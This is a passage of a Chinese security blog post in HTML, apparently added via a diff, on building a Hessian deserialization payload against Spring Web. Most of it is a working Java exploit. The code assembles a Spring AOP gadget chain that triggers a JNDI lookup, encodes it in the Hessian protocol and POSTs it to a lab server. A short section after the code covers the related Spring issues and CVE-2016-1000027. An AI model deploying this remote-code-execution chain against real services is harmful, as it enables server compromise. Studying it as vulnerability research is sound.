class="line">        setFieldValue(aif, <span class="string">&quot;name&quot;</span>, jndiUrl);</span><br><span class="line"></span><br><span class="line">        <span class="type">AbstractAspectJAdvice</span> <span class="variable">advice</span> <span class="operator">=</span> createWithoutConstructor(AspectJAroundAdvice.class);</span><br><span class="line">        setFieldValue(advice, <span class="string">&quot;aspectInstanceFactory&quot;</span>, aif);</span><br><span class="line"></span><br><span class="line">        <span class="type">AspectJPointcutAdvisor</span> <span class="variable">advisor</span> <span class="operator">=</span> createWithoutConstructor(AspectJPointcutAdvisor.class);</span><br><span class="line">        setFieldValue(advisor, <span class="string">&quot;advice&quot;</span>, advice);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; pcahCl = Class.forName(<span class="string">&quot;org.springframework.aop.aspectj.autoproxy.AspectJAwareAdvisorAutoProxyCreator$PartiallyComparableAdvisorHolder&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">pcah</span> <span class="operator">=</span> createWithoutConstructor(pcahCl);</span><br><span class="line">        setFieldValue(pcah, <span class="string">&quot;advisor&quot;</span>, advisor);</span><br><span class="line"></span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(pcah);</span><br><span class="line">        <span class="type">HotSwappableTargetSource</span> <span class="variable">v2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HotSwappableTargetSource</span>(<span class="keyword">new</span> <span class="title class_">XString</span>(<span class="string">&quot;xxx&quot;</span>));</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; s = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line">        Class&lt;?&gt; nodeC;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Node&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( ClassNotFoundException e ) &#123;</span><br><span class="line">            nodeC = Class.forName(<span class="string">&quot;java.util.HashMap$Entry&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Constructor&lt;?&gt; nodeCons = nodeC.getDeclaredConstructor(<span class="type">int</span>.class, Object.class, Object.class, nodeC);</span><br><span class="line">        nodeCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Object</span> <span class="variable">tbl</span> <span class="operator">=</span> Array.newInstance(nodeC, <span class="number">2</span>);</span><br><span class="line">        Array.set(tbl, <span class="number">0</span>, nodeCons.newInstance(<span class="number">0</span>, v1, v1, <span class="literal">null</span>));</span><br><span class="line">        Array.set(tbl, <span class="number">1</span>, nodeCons.newInstance(<span class="number">0</span>, v2, v2, <span class="literal">null</span>));</span><br><span class="line">        setFieldValue(s, <span class="string">&quot;table&quot;</span>, tbl);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化 启动!</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Hessian RPC协议</span></span><br><span class="line">        byteArrayOutputStream.write(<span class="number">99</span>);<span class="comment">// H</span></span><br><span class="line">        byteArrayOutputStream.write(<span class="number">2</span>);<span class="comment">// major</span></span><br><span class="line">        byteArrayOutputStream.write(<span class="number">0</span>);<span class="comment">// minor</span></span><br><span class="line">        <span class="comment">// com.caucho.hessian.io.HessianInput.skipOptionalCall</span></span><br><span class="line">        byteArrayOutputStream.write(<span class="number">99</span>);</span><br><span class="line">        byteArrayOutputStream.write(<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0</span>,<span class="number">0</span>&#125;);</span><br><span class="line">        <span class="comment">// com.caucho.hessian.io.AbstractHessianInput.readHeader</span></span><br><span class="line">        byteArrayOutputStream.write(<span class="number">72</span>);</span><br><span class="line">        byteArrayOutputStream.write(<span class="number">0</span>);</span><br><span class="line">        byteArrayOutputStream.write(<span class="number">0</span>);</span><br><span class="line">        <span class="comment">// rce payload(hessian spring PartiallyComparableAdvisorHolder jndi利用链)</span></span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">hessianOutput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="comment">// 设置hessian协议版本(1/2)</span></span><br><span class="line">        hessianOutput.setVersion(<span class="number">2</span>);</span><br><span class="line">        <span class="comment">// 设置允许反序列化非Serialize对象</span></span><br><span class="line">        hessianOutput.getSerializerFactory().setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        hessianOutput.writeObject(s);</span><br><span class="line">        hessianOutput.flush();</span><br><span class="line">        <span class="type">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="comment">// 使用woodpecker-request库发送payload</span></span><br><span class="line">        <span class="type">RawResponse</span> <span class="variable">response</span> <span class="operator">=</span> Requests.post(<span class="string">&quot;http://192.168.112.136:8080/hessian&quot;</span>)</span><br><span class="line">                .headers(<span class="keyword">new</span> <span class="title class_">Header</span>(<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;application/hessian&quot;</span>))</span><br><span class="line">                .body(bytes)</span><br><span class="line">                .proxy(Proxies.httpProxy(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="number">8080</span>))</span><br><span class="line">                .verify(<span class="literal">false</span>)</span><br><span class="line">                .timeout(<span class="number">10000</span>)</span><br><span class="line">                .send();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span> <span class="params">( <span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span> <span class="params">( <span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName )</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">            <span class="keyword">if</span> ( field != <span class="literal">null</span> )</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> ( clazz.getSuperclass() != <span class="literal">null</span> )</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> field;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( NoSuchFieldException e ) &#123;</span><br><span class="line">            <span class="keyword">if</span> ( !clazz.getSuperclass().equals(Object.class) ) &#123;</span><br><span class="line">                <span class="keyword">return</span> getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithoutConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        <span class="keyword">return</span> createWithConstructor(classToInstantiate, Object.class, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">createWithConstructor</span> <span class="params">( Class&lt;T&gt; classToInstantiate, Class&lt;? <span class="built_in">super</span> T&gt; constructorClass, Class&lt;?&gt;[] consArgTypes, Object[] consArgs )</span> <span class="keyword">throws</span> NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException &#123;</span><br><span class="line">        Constructor&lt;? <span class="built_in">super</span> T&gt; objCons = constructorClass.getDeclaredConstructor(consArgTypes);</span><br><span class="line">        objCons.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Constructor&lt;?&gt; sc = ReflectionFactory.getReflectionFactory().newConstructorForSerialization(classToInstantiate, objCons);</span><br><span class="line">        sc.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> (T) sc.newInstance(consArgs);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>VPS收到JNDI请求<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174241418-172760439765812.png" alt="image-20240929174241418"></p>
+<h2 id="挖坟"><a href="#挖坟" class="headerlink" title="挖坟"></a>挖坟</h2><p>复现完成后觉得这种程度的漏洞网上搜不到感觉有点奇怪，于是去Spring Web的Github主页逛了下，发现了两个issue：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/issues/25379">Deprecate remoting technologies support · Issue #25379 · spring-projects&#x2F;spring-framework</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/issues/24434">Sonatype vulnerability CVE-2016-1000027 in Spring-web project · Issue #24434 · spring-projects&#x2F;spring-framework</a></li>
+</ul>
+<p>简单说就是20年的时候有人说HttpInvokerServiceExporter#readRemoteInvocation方法是不安全的，然而这是对外暴露远程方法的正常需求，而Java反序列化本身就是不安全，所以这个问题并没有修复方法，只能说不要让不可信的Hessian客户端调用Hessian服务端。所以是否会产生问题要取决于具体的使用场景。但官方也表示将会逐渐放弃对如下包的支持，其中就有本次的主角：<img src="/2024/09/29/spring-web-hessian-deserialization/image-20240929174251648-172760439765813.png" alt="image-20240929174251648">从这里也能看出对于上游开发者来说，从安全的角度应该尽可能的覆盖，而不是将安全性取决与用户的使用方式，也就是默认安全原则，否则很可能会留下安全隐患，因为业务程序员一般不太想思考业务以外的问题，毕竟又不是不能用.jpg；但作为安全从业者，我只想说：好好好，多来点。</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">首页</a></li>
+        
+          <li><a href="/about/">关于</a></li>
+        
+          <li><a href="/archives/">归档</a></li>
+        
+          <li><a target="_blank" rel="noopener" href="https://github.com/runt0">项目</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">1.</span> <span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian%E6%9C%8D%E5%8A%A1%E7%AB%AF"><span class="toc-number">2.1.</span> <span class="toc-text">Hessian服务端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hessian%E5%AE%A2%E6%88%B7%E7%AB%AF"><span class="toc-number">2.2.</span> <span class="toc-text">Hessian客户端</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">2.3.</span> <span class="toc-text">调试分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%96%E5%9D%9F"><span class="toc-number">3.</span> <span class="toc-text">挖坟</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/09/29/spring-web-hessian-deserialization/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&text=spring web hessian反序列化payload构造"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&is_video=false&description=spring web hessian反序列化payload构造"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=spring web hessian反序列化payload构造&body=Check out this article: http://example.com/2024/09/29/spring-web-hessian-deserialization/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&title=spring web hessian反序列化payload构造"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/09/29/spring-web-hessian-deserialization/&name=spring web hessian反序列化payload构造&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/09/29/spring-web-hessian-deserialization/&t=spring web hessian反序列化payload构造"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2024
+    runt0
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/runt0">项目</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功！");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
